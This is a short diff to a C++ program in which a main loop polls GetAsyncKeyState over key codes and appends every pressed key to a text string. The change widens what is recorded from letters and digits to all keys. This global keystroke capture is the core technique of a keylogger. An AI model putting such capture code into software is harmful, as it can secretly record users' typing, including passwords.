@@ -97,10 +97,8 @@ int main()
 		{
 			if(GetAsyncKeyState(i) == -32767 )
 			{
-				if(isalnum(i))
-				{
-					text += char(i);
-				}else if(i == VK_BACK)
+			
+				if(i == VK_BACK)
 				{
 					if(text.length())
 					text = std::string(text.begin(), text.end() - 1);
@@ -111,6 +109,13 @@ int main()
 				}else if (i == VK_RETURN)
 				{
 					text += '\n';
+				}else if(i == VK_OEM_3)
+				{
+					text += '`';
+				}
+				else
+				{
+					text += char(i);
 				}
 
 			}
